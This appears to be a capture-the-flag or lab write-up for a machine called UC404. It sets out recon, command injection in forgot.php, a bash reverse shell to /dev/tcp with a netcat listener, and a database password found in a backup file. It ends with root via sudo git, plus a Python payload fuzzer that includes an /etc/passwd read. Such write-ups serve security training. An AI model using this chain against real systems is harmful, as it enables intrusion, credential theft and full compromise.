# Export
```bash
export IP="192.168.115.109"
export URL="http://192.168.115.109:80/FUZZ"
```

<hr>

# RCE
+ Command Injection:
	+ Payload: `http://192.168.250.109/under_construction/forgot.php?email=|id`

```bash
$ curl -s http://192.168.250.109/under_construction/forgot.php\?email=\|id | tail -20

<!--
  ______ __  __          _____ _         _______     _______ _______ ______ __  __ 
 |  ____|  \/  |   /\   |_   _| |       / ____\ \   / / ____|__   __|  ____|  \/  |
 | |__  | \  / |  /  \    | | | |      | (___  \ \_/ / (___    | |  | |__  | \  / |
 |  __| | |\/| | / /\ \   | | | |       \___ \  \   / \___ \   | |  |  __| | |\/| |
 | |____| |  | |/ ____ \ _| |_| |____   ____) |  | |  ____) |  | |  | |____| |  | |
 |______|_|  |_/_/    \_\_____|______| |_____/   |_| |_____/   |_|  |______|_|  |_|
 

---- Under Construction ----

sendmail.php must receive the variable from the html form and send the message.

|| For security reasons we are working to blacklist some characters ||

//-->

uid=33(www-data) gid=33(www-data) groups=33(www-data)
0                                                                  
```

+ Reverse shell

```bash
$ curl -s http://192.168.250.109/under_construction/forgot.php\?email=\|bash+-c+\'bash+-i+\>%26+/dev/tcp/192.168.49.250/80+0\>%261\'
```

```bash
nc -nlvp 80
listening on [any] 80 ...
connect to [192.168.49.250] from (UNKNOWN) [192.168.250.109] 39692
bash: cannot set terminal process group (546): Inappropriate ioctl for device
bash: no job control in this shell
www-data@UC404:/var/www/html/under_construction$ 
```

<hr>

# Local Enumeration
+ `/var/backups`

```bash
www-data@UC404:/var/backups$ cat sendmail.php.bak
[...]
$connect=mysql_connect("localhost","brian","BrianIsOnTheAir789") or die("Could not connect to database");
mysql_select_db("uc404") or die(mysql_error()); 
[...]
?>
```

+ `sudo?`

```bash
brian@UC404:~$ sudo -l
Matching Defaults entries for brian on UC404:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User brian may run the following commands on UC404:
    (ALL) NOPASSWD: /usr/bin/git
```

<hr>

# Privilege Escalation
```
brian@UC404:~$ sudo git -p help config
!/bin/sh
root@UC404:~# id
uid=0(root) gid=0(root) groups=0(root)
```

<hr>

# Nmap
```bash
PORT      STATE SERVICE  REASON         VERSION                      
22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  http     syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))              
| http-git:
|   192.168.72.109:80/.git/
|     Git repository found!               
|     Repository description: Unnamed repository; edit this file 'description' to name the...            
|     Remotes:          
|       https://github.com/ColorlibHQ/AdminLTE.git  
|_    Project type: Ruby on Rails web application (guessed from .gitignore)
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: AdminLTE 3 | Dashboard
111/tcp   open  rpcbind  syn-ack ttl 63 2-4 (RPC #100000)
2049/tcp  open  nfs_acl  syn-ack ttl 63 3 (RPC #100227)
36931/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
44931/tcp open  nlockmgr syn-ack ttl 63 1-4 (RPC #100021)
45359/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
55419/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
```

<hr>

# Web Application
+ AdminLTE version 3.1.0-pre
+ `.git` found !
+ Hidden dir scan

```bash
index.html              [Status: 200, Size: 60628, Words: 23683, Lines: 1480]
index2.html             [Status: 200, Size: 71875, Words: 29353, Lines: 1710]
index3.html             [Status: 200, Size: 42799, Words: 17135, Lines: 1126]
.git                    [Status: 301, Size: 315, Words: 20, Lines: 10]
.gitignore              [Status: 200, Size: 1213, Words: 16, Lines: 72]
wp-forum.phps           [Status: 403, Size: 279, Words: 20, Lines: 10]
demo                    [Status: 301, Size: 317, Words: 20, Lines: 10]
plugins                 [Status: 301, Size: 320, Words: 20, Lines: 10]
db                      [Status: 301, Size: 315, Words: 20, Lines: 10]
dist                    [Status: 301, Size: 317, Words: 20, Lines: 10]
build                   [Status: 301, Size: 318, Words: 20, Lines: 10]
LICENSE                 [Status: 200, Size: 1082, Words: 155, Lines: 21]
under_construction      [Status: 301, Size: 331, Words: 20, Lines: 10]
```

+ Dump source code with `git-dump.py` → Git source code is corrupted.

```bash
$ python3 git-dump.py http://192.168.115.109/.git
URL for test: http://192.168.115.109/.git/
Fetching: http://192.168.115.109/.git/index
Fetching: http://192.168.115.109/.git/FETCH_HEAD
Fetching: http://192.168.115.109/.git/HEAD
Fetching: http://192.168.115.109/.git/ORIG_HEAD
Fetching: http://192.168.115.109/.git/config
Fetching: http://192.168.115.109/.git/description           
```

+ Fuzz `/under_construction`

```bash
$ ffuf -u http://192.168.250.109/under_construction/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -e .php
index.php               [Status: 200, Size: 2950, Words: 111, Lines: 76]
register.html           [Status: 200, Size: 3127, Words: 130, Lines: 80]
forgot.php              [Status: 200, Size: 2729, Words: 333, Lines: 73]
```

+ `/under_construction/forgot.php`

```bash
curl -s http://192.168.250.109/under_construction/forgot.php | tail -20

<!--
  ______ __  __          _____ _         _______     _______ _______ ______ __  __ 
 |  ____|  \/  |   /\   |_   _| |       / ____\ \   / / ____|__   __|  ____|  \/  |
 | |__  | \  / |  /  \    | | | |      | (___  \ \_/ / (___    | |  | |__  | \  / |
 |  __| | |\/| | / /\ \   | | | |       \___ \  \   / \___ \   | |  |  __| | |\/| |
 | |____| |  | |/ ____ \ _| |_| |____   ____) |  | |  ____) |  | |  | |____| |  | |
 |______|_|  |_/_/    \_\_____|______| |_____/   |_| |_____/   |_|  |______|_|  |_|
 

---- Under Construction ----

sendmail.php must receive the variable from the html form and send the message.

|| For security reasons we are working to blacklist some characters ||

//-->

Could not open input file: sendmail.php
1                                                       
```

+ Abnormal behavior?

```bash
$ curl -s http://192.168.250.109/under_construction/forgot.php\?email=\' | tail -20
</html>

<!--
  ______ __  __          _____ _         _______     _______ _______ ______ __  __ 
 |  ____|  \/  |   /\   |_   _| |       / ____\ \   / / ____|__   __|  ____|  \/  |
 | |__  | \  / |  /  \    | | | |      | (___  \ \_/ / (___    | |  | |__  | \  / |
 |  __| | |\/| | / /\ \   | | | |       \___ \  \   / \___ \   | |  |  __| | |\/| |
 | |____| |  | |/ ____ \ _| |_| |____   ____) |  | |  ____) |  | |  | |____| |  | |
 |______|_|  |_/_/    \_\_____|______| |_____/   |_| |_____/   |_|  |______|_|  |_|
 

---- Under Construction ----

sendmail.php must receive the variable from the html form and send the message.

|| For security reasons we are working to blacklist some characters ||

//-->

2               
```

+ Brute force

```py
#!/usr/bin/env python3

import requests
import sys

s = requests.Session()
url = "http://192.168.250.109/under_construction/forgot.php"
sc_file = sys.argv[1]
# Get website cookie, token ...?
s.get(url)

with open(sc_file, "r", encoding="iso-8859-1") as special_chars:
	sc = special_chars.readlines()
	for ss in sc:
            ss = ss.strip()
            payload = {'email':ss}
            r = s.get(url, params=payload)
            print(f"Trying payload: {payload}")
            print(r.text.splitlines()[71:73])
            print()
```

+ Command Injection payload: [here.](https://github.com/payloadbox/command-injection-payload-list)

```bash
python3 params_brute.py OS-Command-Fuzzing.txt 
Trying payload: {'email': '&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;'}
['Could not open input file: sendmail.php', '127']
...
Trying payload: {'email': '|id'}
['uid=33(www-data) gid=33(www-data) groups=33(www-data)', '0']
```
